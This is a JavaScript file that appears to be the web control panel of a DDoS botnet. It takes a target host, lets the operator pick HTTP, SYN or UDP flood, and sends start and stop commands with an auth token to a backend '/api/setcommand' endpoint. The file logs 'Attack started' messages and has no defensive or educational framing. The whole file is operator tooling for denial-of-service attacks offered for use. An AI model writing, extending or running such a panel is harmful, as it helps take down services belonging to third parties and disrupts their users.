const target = document.getElementById('target');
const httpbox = document.getElementById('httpflood');
const synbox = document.getElementById('synflood');
const udpbox = document.getElementById('udpflood');
const attackbtn = document.getElementById('attackbtn');
const stopbtn = document.getElementById('stopbtn');
const container = document.getElementById('container');
const terminal = document.getElementById('terminal');

attackbtn.addEventListener('click', () => {
    const check = [httpbox.checked, synbox.checked, udpbox.checked];
    const method = ['httpFlood', 'synFlood', 'udpFlood'];

    if (check.filter(item => item === true).length > 1) {
        alert(`Set 1 method not ${check.filter(item => item === true).length}`);
        return location.reload();
    };

    if (target.value === "") {
        alert('Set the target host');
        return location.reload();
    };

    if (!target.value.match(new RegExp(/(https?:\/\/)?([\w\-])+\.{1}([a-zA-Z]{2,63})([\/\w-]*)*\/?\??([^#\n\r]*)?#?([^\n\r]*)/)) && check[0] === true) {
        alert('Set an url for the httpFlood');
        return location.reload();
    };

    fetch(`${config.baseURL}/api/setcommand`, {
        headers: {
            'Content-Type': 'application/json',
            token: config.token,
            method: method[check.indexOf(true)],
            target: target.value
        }
    })
        .then(res => res.json())
        .then(data => {
            if (data.code === 200) {
                attackbtn.style.display = "none";
                container.style.display = "none";
                terminal.style.display = "block";
                stopbtn.style.display = "initial";
                term.log(`Attack started to ${target.value} with ${method[check.indexOf(true)]} method`, 'load');
                stopbtn.addEventListener('click', () => {
                    return fetch(`${config.baseURL}/api/setcommand`, {
                        headers: {
                            'Content-Type': 'application/json',
                            token: config.token,
                            method: 'stop'
                        }
                    })
                        .then(res => res.json())
                        .then(data => {
                            if (data.code === 200) {
                                alert(`Attack to ${target.value} is successfuly stopped`);
                                return location.reload();
                            } else
                                return alert(data.message);
                        });
                });
            } else
                return location.reload();
        });
});